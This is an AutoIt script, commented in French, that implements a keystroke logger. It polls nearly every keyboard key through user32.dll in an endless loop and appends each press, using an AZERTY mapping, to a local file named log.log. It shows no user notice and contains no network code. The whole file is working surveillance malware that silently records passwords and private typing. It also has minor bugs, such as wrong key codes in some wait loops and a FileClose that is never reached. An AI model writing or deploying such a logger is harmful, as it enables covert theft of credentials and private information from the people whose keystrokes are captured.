
Dim $Fichier
$Fichier = $Dir & "\log.log"
Dim $VarTmp
$VarTmp = ""
Dim $dll
$dll = DllOpen("user32.dll")

Dim $file
$file = FileOpen($Fichier, 1)
; Check if file opened for writing OK
If $file = -1 Then
MsgBox(0, "Error", "Unable to open file.")
Exit
EndIf

While 1
;Sleep ( 50 )
;Kpres("01", "Left mouse button")
;Kpres("02", "Right mouse button")
;Kpres("04", "Middle mouse button")
;Kpres("05", "Windows 2000/XP: X1 mouse button")
;Kpres("06", "Windows 2000/XP: X2 mouse button")
Kpres("08", "|BACKSPACE|")
While _IsPressed("08") = 1
WEnd
Kpres("09", "|TAB|")
While _IsPressed("09") = 1
WEnd
Kpres("0C", "|CLEAR|")
While _IsPressed("0C") = 1
WEnd
Kpres("0D", "|ENTER|")
While _IsPressed("0D") = 1
WEnd
Kpres("10", "|SHIFT|")
;While _IsPressed("10") = 1
;WEnd
Kpres("11", "|CTRL|")
;While _IsPressed("11") = 1
;WEnd
Kpres("12", "|ALT|")
While _IsPressed("12") = 1
WEnd
Kpres("13", "|PAUSE|")
While _IsPressed("13") = 1
WEnd
Kpres("14", "|CAPS-LOCK|")
While _IsPressed("14") = 1
WEnd
Kpres("1B", "|ESC|")
While _IsPressed("1B") = 1
WEnd
Kpres("20", " |SPACEBAR| ")
While _IsPressed("20") = 1
WEnd
Kpres("21", "|PAGE-UP|")
While _IsPressed("21") = 1
WEnd
Kpres("22", "|PAGE-DOWN|")
While _IsPressed("22") = 1
WEnd
Kpres("23", "|END|")
While _IsPressed("12") = 1
WEnd
Kpres("24", "|HOME|")
While _IsPressed("24") = 1
WEnd
Kpres("25", "|LEFT-ARROW|")
While _IsPressed("25") = 1
WEnd
Kpres("26", "|UP-ARROW|")
While _IsPressed("26") = 1
WEnd
Kpres("27", "|RIGHT-ARROW|")
While _IsPressed("27") = 1
WEnd
Kpres("28", "|DOWN-ARROW|")
While _IsPressed("28") = 1
WEnd
Kpres("29", "|SELECT|")
While _IsPressed("29") = 1
WEnd
Kpres("2A", "|PRINT|")
While _IsPressed("2A") = 1
WEnd
Kpres("2B", "|EXECUTE|")
While _IsPressed("2B") = 1
WEnd
Kpres("2C", "|PRINT-SCREEN|")
While _IsPressed("2C") = 1
WEnd
Kpres("2D", "INS")
While _IsPressed("2D") = 1
WEnd
Kpres("2E", "DEL")
While _IsPressed("2E") = 1
WEnd
Kpres("30", "à")
While _IsPressed("30") = 1
WEnd
Kpres("31", "&")
While _IsPressed("31") = 1
WEnd
Kpres("32", "é")
While _IsPressed("32") = 1
WEnd
Kpres("33", "#")
While _IsPressed("33") = 1
WEnd
Kpres("34", "'")
While _IsPressed("34") = 1
WEnd
Kpres("35", "(")
While _IsPressed("35") = 1
WEnd
Kpres("36", "-")
While _IsPressed("36") = 1
WEnd
Kpres("37", "è")
While _IsPressed("37") = 1
WEnd
Kpres("38", "_")
While _IsPressed("38") = 1
WEnd
Kpres("39", "ç")
While _IsPressed("39") = 1
WEnd
Kpres("41", "A")
While _IsPressed("41") = 1
WEnd
Kpres("42", "B")
While _IsPressed("42") = 1
WEnd
Kpres("43", "C")
While _IsPressed("43") = 1
WEnd
Kpres("44", "D")
While _IsPressed("44") = 1
WEnd
Kpres("45", "E")
While _IsPressed("45") = 1
WEnd
Kpres("46", "F")
While _IsPressed("46") = 1
WEnd
Kpres("47", "G")
While _IsPressed("47") = 1
WEnd
Kpres("48", "H")
While _IsPressed("48") = 1
WEnd
Kpres("49", "I")
While _IsPressed("49") = 1
WEnd
Kpres("4A", "J")
While _IsPressed("4A") = 1
WEnd
Kpres("4B", "K")
While _IsPressed("4B") = 1
WEnd
Kpres("4C", "L")
While _IsPressed("4C") = 1
WEnd
Kpres("4D", "M")
While _IsPressed("4D") = 1
WEnd
Kpres("4E", "N")
While _IsPressed("4E") = 1
WEnd
Kpres("4F", "O")
While _IsPressed("4F") = 1
WEnd
Kpres("50", "P")
While _IsPressed("50") = 1
WEnd
Kpres("51", "Q")
While _IsPressed("51") = 1
WEnd
Kpres("52", "R")
While _IsPressed("52") = 1
WEnd
Kpres("53", "S")
While _IsPressed("53") = 1
WEnd
Kpres("54", "T")
While _IsPressed("54") = 1
WEnd
Kpres("55", "U")
While _IsPressed("55") = 1
WEnd
Kpres("56", "V")
While _IsPressed("56") = 1
WEnd
Kpres("57", "W")
While _IsPressed("57") = 1
WEnd
Kpres("58", "X")
While _IsPressed("58") = 1
WEnd
Kpres("59", "Y")
While _IsPressed("59") = 1
WEnd
Kpres("5A", "Z")
While _IsPressed("5A") = 1
WEnd
Kpres("5B", "|Left-Windows|")
;While _IsPressed("5B") = 1
;WEnd
Kpres("5C", "|Right-Windows|")
;While _IsPressed("5C") = 1
;WEnd
Kpres("60", "0")
While _IsPressed("60") = 1
WEnd
Kpres("61", "1")
While _IsPressed("61") = 1
WEnd
Kpres("62", "2")
While _IsPressed("62") = 1
WEnd
Kpres("63", "3")
While _IsPressed("63") = 1
WEnd
Kpres("64", "4")
While _IsPressed("64") = 1
WEnd
Kpres("65", "5")
While _IsPressed("65") = 1
WEnd
Kpres("66", "6")
While _IsPressed("66") = 1
WEnd
Kpres("67", "7")
While _IsPressed("67") = 1
WEnd
Kpres("68", "8")
While _IsPressed("68") = 1
WEnd
Kpres("69", "9")
While _IsPressed("69") = 1
WEnd
Kpres("6A", "|Multiply|")
While _IsPressed("6A") = 1
WEnd
Kpres("6B", "|Add|")
While _IsPressed("6B") = 1
WEnd
Kpres("6C", "|Separator|")
While _IsPressed("6C") = 1
WEnd
Kpres("6D", "|Subtract|")
While _IsPressed("6D") = 1
WEnd
Kpres("6E", "|Decimal|")
While _IsPressed("6E") = 1
WEnd
Kpres("6F", "|Divide|")
While _IsPressed("6F") = 1
WEnd
Kpres("70", "F1")
While _IsPressed("70") = 1
WEnd
Kpres("71", "F2")
While _IsPressed("71") = 1
WEnd
Kpres("72", "F3")
While _IsPressed("72") = 1
WEnd
Kpres("73", "F4")
While _IsPressed("73") = 1
WEnd
Kpres("74", "F5")
While _IsPressed("74") = 1
WEnd
Kpres("75", "F6")
While _IsPressed("75") = 1
WEnd
Kpres("76", "F7")
While _IsPressed("76") = 1
WEnd
Kpres("77", "F8")
While _IsPressed("77") = 1
WEnd
Kpres("78", "F9")
While _IsPressed("78") = 1
WEnd
Kpres("79", "F10")
While _IsPressed("79") = 1
WEnd
Kpres("7A", "F11")
While _IsPressed("7A") = 1
WEnd
Kpres("7B", "F12")
While _IsPressed("7B") = 1
WEnd
Kpres("90", "NUMLOCK")
While _IsPressed("90") = 1
WEnd
Kpres("91", "SCROLLLOCK")
While _IsPressed("91") = 1
WEnd
Kpres("A0", "|Left-SHIFT|")
;While _IsPressed("A0") = 1
;WEnd
Kpres("A1", "|Right-SHIFT|")
;While _IsPressed("A1") = 1
;WEnd
Kpres("A2", "|Left-CONTROL|")
;While _IsPressed("A2") = 1
;WEnd
Kpres("A3", "|Right-CONTROL|")
;While _IsPressed("A3") = 1
;WEnd
Kpres("A4", "|Left-MENU|")
While _IsPressed("A4") = 1
WEnd
Kpres("A5", "|Right-MENU|")
While _IsPressed("A4") = 1
WEnd
Kpres("BA", ";")
While _IsPressed("BA") = 1
WEnd
Kpres("BB", "=")
While _IsPressed("BB") = 1
WEnd
Kpres("BC", ",")
While _IsPressed("BC") = 1
WEnd
Kpres("BD", "-")
While _IsPressed("BD") = 1
WEnd
Kpres("BE", ".")
While _IsPressed("BE") = 1
WEnd
Kpres("BF", "/")
While _IsPressed("BF") = 1
WEnd
Kpres("C0", "`")
While _IsPressed("C0") = 1
WEnd
Kpres("DB", "[")
While _IsPressed("DB") = 1
WEnd
Kpres("DC", "\")
While _IsPressed("DC") = 1
WEnd
Kpres("DD", "]")
While _IsPressed("DD") = 1
WEnd

WEnd
DllClose($dll)


func Kpres($num,$res)
If _IsPressed($num, $dll) Then
Select
case $num = "0D"
FileWrite($file,@CRLF)
case $num = "20"
FileWrite($file, " ")
case $num = "08"
FileWrite($file, "")
case Else
FileWrite($file, $res)
EndSelect

Endif

EndFunc

FileClose($file)